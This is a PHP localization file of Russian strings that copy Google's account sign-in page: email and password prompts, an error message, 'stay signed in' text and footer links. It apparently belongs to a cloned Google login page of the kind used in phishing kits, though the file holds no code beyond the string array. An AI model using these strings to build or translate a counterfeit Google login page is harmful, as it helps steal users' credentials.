<?php
/*
------------------
Language: Russian
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'Войти - аккаунт Google';
$lang['SIGN_IN'] = 'войти в систему';
$lang['CONT_GMAIL'] = 'продолжить в Gmail';
$lang['PASSWORD'] = 'пароль';
$lang['EMAIL'] = 'E-mail или телефон';
$lang['NEXT'] = 'следующий';
$lang['SIGN'] = 'войти в систему';
$lang['FORGOT'] = 'забыл пароль?';
$lang['ERROR'] = 'неверный логин и пароль';

//Google Log in
$lang['ONE'] = 'Один аккаунт Все из Google.';
$lang['SIGN_WITH'] = 'Войдите в свой аккаунт Google';
$lang['STAY'] = 'Оставайтесь в системе';
$lang['KEEP_CHECKED'] = 'Для вашего удобства держите это проверенным. На общих устройствах рекомендуются дополнительные меры предосторожности.';
$lang['SIGN_DIFFERENT'] = 'Войти под другим аккаунтом';
$lang['EVERYTHING'] = 'Один аккаунт Google для всего Google';
$lang['ABOUT'] = 'О Google';
$lang['PRIVACY'] = 'Конфиденциальность';
$lang['TERM'] = 'условия';
$lang['HELP'] = 'Помогите';
$lang['FIND_ACCOUNT'] = 'Найти мой аккаунт';
$lang['CREATE'] = 'Регистрация';
?>